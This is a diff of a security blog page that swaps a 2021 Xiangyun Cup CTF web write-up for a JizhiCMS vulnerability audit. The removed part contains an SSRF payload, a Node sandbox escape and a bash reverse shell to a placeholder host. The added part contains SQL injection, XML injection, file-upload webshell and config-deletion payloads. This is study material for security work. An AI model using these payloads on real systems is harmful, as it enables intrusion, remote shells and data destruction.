@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">祥云杯2021 Web | Troy3e</title>
+  <title itemprop="name">极致CMS漏洞整合与分析 | Troy3e</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -185,11 +185,11 @@
 
   <div class="pattern-center single-center">
     <!-- 有配图默认渲染第一张 -->
-    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1184447.png);" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1184447.png">
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-304364.jpg);" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-304364.jpg">
     </div>
     <header class="pattern-header single-header">
       <h1 class="entry-title">
-      祥云杯2021 Web</h1>
+      极致CMS漏洞整合与分析</h1>
       <p class="entry-census">
         <span>
           <a href="">
@@ -201,7 +201,7 @@
         </span>
         <span class="bull">
         ·</span>
-        2021-10-21<span class="bull">
+        2021-10-30<span class="bull">
         ·</span>
       <span id="busuanzi_value_page_pv"></span>次阅读</p>
     </header>
@@ -215,52 +215,103 @@
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
         
         <div class="entry-content">
-          <h2 id="2021祥云杯-Package-Manager-2021"><a href="#2021祥云杯-Package-Manager-2021" class="headerlink" title="[2021祥云杯]Package Manager 2021"></a>[2021祥云杯]Package Manager 2021</h2><p>虽然还是看不太懂这种js，但是不影响做题。</p>
-<p>根据经验先看routes里的index.ts。发现auth处存在字符串的拼接：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211021135626.png" alt></p>
-<p>跟进checkmd5Regex</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211021135828.png" alt></p>
-<p>没有匹配开头结尾，也就是在后面拼接内容就可以过正则。</p>
-<p>写个脚本跑就行。</p>
-<pre><code>ffffffffffffffffffffffffffffffff&quot;||this.password[0]==&quot;!
-</code></pre><h2 id="2021祥云杯-secrets-of-admin"><a href="#2021祥云杯-secrets-of-admin" class="headerlink" title="[2021祥云杯]secrets_of_admin"></a>[2021祥云杯]secrets_of_admin</h2><p>用database.ts里给的admin登录</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211021143637.png" alt></p>
-<p>进去是个创建pdf的功能<br>找一下相关代码：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211021144308.png" alt></p>
-<p>继续往下看，是一个读取文件的接口：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211021152012.png" alt></p>
-<p>但是superuser被禁用了</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211021152044.png" alt></p>
-<p>而flag就是superuser的</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211021152121.png" alt></p>
-<p>所以需要把flag给admin，也就是给admin一个文件名，让他文件名不是flag，和路径拼接到一起时又可以读到flag文件，比如./flag。可/api/files那里又需要本地访问，所以需要ssrf。<br>不熟悉pdf这里的ssrf，google找到了 CVE-2019-15138</p>
-<pre><code>&lt;script&gt;
-var Troy3e = new XMLHttpRequest();Troy3e.open(&quot;GET&quot;, &quot;http://127.0.0.1:8888/api/files?username=admin&amp;filename=./flag&amp;checksum=123&quot;, true);Troy3e.send();
-&lt;/script&gt;
-</code></pre><p>过滤了小标签和script，用数组绕过</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211021154834.png" alt></p>
-<p>最后访问/api/files/123。</p>
-<h2 id="2021祥云杯-cralwer-z"><a href="#2021祥云杯-cralwer-z" class="headerlink" title="[2021祥云杯]cralwer_z"></a>[2021祥云杯]cralwer_z</h2><p>index是普通的注册登录，没有利用点。</p>
-<p>user.js有profile、verify、bucket三个路由。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211021163054.png" alt></p>
-<p>bucket这里会访问user.bucket，大概这就是利用点了。<br>首先必须满足如下要求</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211021170045.png" alt></p>
-<p>跟一下看看是不是可控的。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211021163447.png" alt></p>
-<p>显然我们要满足第一个要求是很容易的，但这里不行，也就是这里不会跳转。<br>但是只有跳转到verify才会更新bucket。</p>
-<p>同时，发到verify的token会失效。这说明我们既要满足personalbucket是我们自己的url，也要能满足跳转到verify成功更新bucket。</p>
-<p>所以我们先用默认的bucket发一次请求获取到可以被找到的token</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211021170947.png" alt></p>
-<p>再用自己的url发一次包</p>
-<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211021171005.png" alt></p>
-<p>最后在第一次发的包那里重定向即可更新bucket，访问/user/bucket即可反弹shell。</p>
-<p>读flag</p>
-<pre><code>&lt;script&gt;
-a=this.constructor.constructor.constructor.constructor(&#39;return process&#39;)();b=a.mainModule.require(&#39;child_process&#39;);c=b.execSync(&#39;cat /flag&#39;).toString();document.write(c);
-&lt;/script&gt;
-</code></pre><p>弹shell</p>
-<pre><code>&lt;script&gt;c=&#39;constructor&#39;;this[c][c](&quot;c=&#39;constructor&#39;;require=this[c][c](&#39;return process&#39;)().mainModule.require;var sync=require(&#39;child_process&#39;).spawnSync; var ls = sync(&#39;bash&#39;, [&#39;-c&#39;,&#39;bash -i &gt;&amp; /dev/tcp/x.x.x.x/3333 0&gt;&amp;1&#39;],);console.log(ls.output.toString());&quot;)()&lt;/script&gt;
-</code></pre>
+          <p>闲来无事，随便找个CMS审一审。</p>
+<p>链接：<a href="https://github.com/Cherry-toto/jizhicms/releases/" target="_blank" rel="noopener">https://github.com/Cherry-toto/jizhicms/releases/</a></p>
+<p>随缘更新。</p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211021222816.png" alt></p>
+<p>若出现页面404的，请设置伪静态：<a href="https://www.kancloud.cn/toto/jizhicms/1540682" target="_blank" rel="noopener">https://www.kancloud.cn/toto/jizhicms/1540682</a></p>
+<h1 id="v1-6-7"><a href="#v1-6-7" class="headerlink" title="v1.6.7"></a>v1.6.7</h1><p>源码：<a href="https://codeload.github.com/Cherry-toto/jizhicms/zip/refs/tags/v1.6.7" target="_blank" rel="noopener">https://codeload.github.com/Cherry-toto/jizhicms/zip/refs/tags/v1.6.7</a></p>
+<h2 id="一、存储型XSS"><a href="#一、存储型XSS" class="headerlink" title="一、存储型XSS"></a>一、存储型XSS</h2><p>在发布文章标题插入恶意代码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211021230848.png" alt></p>
+<p>后台管理员查看内容</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211021230809.png" alt></p>
+<p>相关代码在/Home/c/UserController.php</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211021234749.png" alt></p>
+<p>经过html实体化和转义，看上去不会有什么问题。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211021235057.png" alt></p>
+<p>但是这里并没有处理title，所以会触发。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211022000134.png" alt></p>
+<h2 id="二、首页sql注入"><a href="#二、首页sql注入" class="headerlink" title="二、首页sql注入"></a>二、首页sql注入</h2><p>调试出了点小问题，记录一下解决方案（其实是我之前写的那篇文章有点小问题，希望没人看到。。。）：<a href="https://cloud.tencent.com/developer/news/411805" target="_blank" rel="noopener">https://cloud.tencent.com/developer/news/411805</a></p>
+<p>以及调试时超时500的解决方法（需重启web服务）：<a href="https://blog.csdn.net/qq_36505844/article/details/105712135" target="_blank" rel="noopener">https://blog.csdn.net/qq_36505844/article/details/105712135</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211022214200.png" alt></p>
+<p>关键代码在HomeController.php的jizhi()里</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211022224950.png" alt></p>
+<p>下个断点跟一下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211022230603.png" alt></p>
+<p>可以看到我们构造的恶意代码被传入find，继续跟进</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211022230708.png" alt></p>
+<p>FrPHP\lib\Model里的find方法</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211022231830.png" alt></p>
+<p>可以看到恶意代码已经被插入</p>
+<p>原理如下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211022232046.png" alt></p>
+<p>最后报错信息通过\Home\c\ErrorController.php下进行输出。</p>
+<p>漏洞产生原因：一开始看到这个首页sql注入觉得很奇怪，跟了一遍才发现这个功能原本的目的是匹配页面内容（不知道咋形容），只是没有进行过滤，直接插入数据库执行，导致sql注入。</p>
+<h2 id="三、留言界面sql注入"><a href="#三、留言界面sql注入" class="headerlink" title="三、留言界面sql注入"></a>三、留言界面sql注入</h2><p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023124605.png" alt></p>
+<p>下个断点跟一下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023125050.png" alt></p>
+<p>赋值</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023155924.png" alt></p>
+<p>关键在这里，我们的ip和留言的信息一起传入</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023160150.png" alt></p>
+<p>最终执行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023160703.png" alt></p>
+<h2 id="四、发布文章sql注入"><a href="#四、发布文章sql注入" class="headerlink" title="四、发布文章sql注入"></a>四、发布文章sql注入</h2><p>这个似乎是beta版本的洞</p>
+<p>beta：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023164533.png" alt></p>
+<p>正式版：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211023164550.png" alt></p>
+<p>payload</p>
+<pre><code>POST /user/release.html HTTP/1.1
+Host: www.jizhi.com:1238
+Content-Length: 221
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://www.jizhi.com:1238
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://www.jizhi.com:1238/user/release.html
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,ko;q=0.8
+Cookie: PHPSESSID=216fp73bnjss25l5tnlqtb5bmt
+Connection: close
+
+id=&amp;isshow=&amp;molds=article&amp;tid=2&#39;and%20extractvalue(1,%20concat(0x5c,%20(select%20database()),0x5c))%20and%20%20&#39;1&#39;=&#39;1&amp;title=1&amp;keywords=1&amp;litpic=&amp;file_litpic=&amp;description=1&amp;submit=%E6%8F%90%E4%BA%A4&amp;body=%3Cp%3E1%3C%2Fp%3E
+</code></pre><h1 id="v1-7"><a href="#v1-7" class="headerlink" title="v1.7"></a>v1.7</h1><h2 id="一、wechat插件sql注入"><a href="#一、wechat插件sql注入" class="headerlink" title="一、wechat插件sql注入"></a>一、wechat插件sql注入</h2><p>对着Seay的报告审了几个都无果，记得之前看的文章提到wechat部分存在漏洞，于是直接跳到Home/c/WechatController.php。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211028201040.png" alt></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211028201313.png" alt></p>
+<p>显然这里url不可控，所以不存在任意文件读取。<br>但是在上下都有一个M函数，find和add似乎是和数据库交互的语句，参数除了包含不可控的user外还有一个openid</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211028204034.png" alt></p>
+<p>往上看可知openid是可控的xml字符串。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211028215720.png" alt></p>
+<p>注意格式</p>
+<pre><code>&lt;?xml version=&#39;1.0&#39;?&gt;
+&lt;Troy3e&gt;
+&lt;MsgType&gt;event&lt;/MsgType&gt;
+&lt;Event&gt;subscribe&lt;/Event&gt;
+&lt;FromUserName&gt;Troy3e&#39;&lt;/FromUserName&gt;
+&lt;/Troy3e&gt;
+</code></pre><h2 id="二、安装插件处任意文件上传"><a href="#二、安装插件处任意文件上传" class="headerlink" title="二、安装插件处任意文件上传"></a>二、安装插件处任意文件上传</h2><p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211030155816.png" alt></p>
+<p>首先要知道的是frparam这个函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211030160040.png" alt></p>
+<p>所以可知update中filepath、action、download_url等都是可控的。<br>继续往下看，当action传入start-download时：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211030160727.png" alt></p>
+<p>就是下载download_url的文件，放到tmp_path里，而tmp_path是filepath组成的，所以文件路径也是可控的。<br>但是我们不能直接下载php文件，既是因为不知道是否允许上传php，更重要的是tmp_path强制加了zip后缀。</p>
+<p>寻找一下解压的功能</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211030164411.png" alt></p>
+<p>成功上传</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211030164851.png" alt></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211030164936.png" alt></p>
+<p>路径为：<a href="http://www.jizhi.com:1238/A/exts/shell.php" target="_blank" rel="noopener">http://www.jizhi.com:1238/A/exts/shell.php</a></p>
+<h2 id="任意文件夹下载"><a href="#任意文件夹下载" class="headerlink" title="任意文件夹下载"></a>任意文件夹下载</h2><p>也是frparam函数的原因，很简单</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211030165648.png" alt></p>
+<h2 id="后台配置文件删除"><a href="#后台配置文件删除" class="headerlink" title="后台配置文件删除"></a>后台配置文件删除</h2><p>还是frprarm的问题。。。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20211030170005.png" alt></p>
+<p>只要包含config.php，就会把整个文件夹删除</p>
+<p>post</p>
+<p>path=../../Conf&amp;type=2</p>
+
         </div>
         <!-- .entry-content -->
         <div class="single-reward">
@@ -288,36 +339,19 @@ a=this.constructor.constructor.constructor.constructor(&#39;return process&#39;)
       <div class="toc" style="background: none;"></div>
       <section class="post-squares nextprev">
         
+        
           
-            <div class="post-nepre half previous">
+            <div class="post-nepre full next">
           
-            <a href="/2021/10/26/GKCTF 2021/" rel="prev">
+            <a href="/2021/10/26/GKCTF 2021/" rel="next">
               <div class="background">
                 <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1184159.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1184159.jpg">
-              </div>
-              <span class="label">
-              Previous Post</span>
-              <div class="info">
-                <h3>
-                GKCTF 2021</h3>
-                <hr>
-              </div>
-            </a>
-          </div>
-        
-        
-          
-            <div class="post-nepre half next">
-          
-            <a href="/2021/10/16/vulnstack内网靶场-二/" rel="next">
-              <div class="background">
-                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-876112.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-876112.png">
               </div>
               <span class="label">
               Next Post</span>
               <div class="info">
                 <h3>
-                vulnstack内网靶场(二)</h3>
+                GKCTF 2021</h3>
                 <hr>
               </div>
             </a>
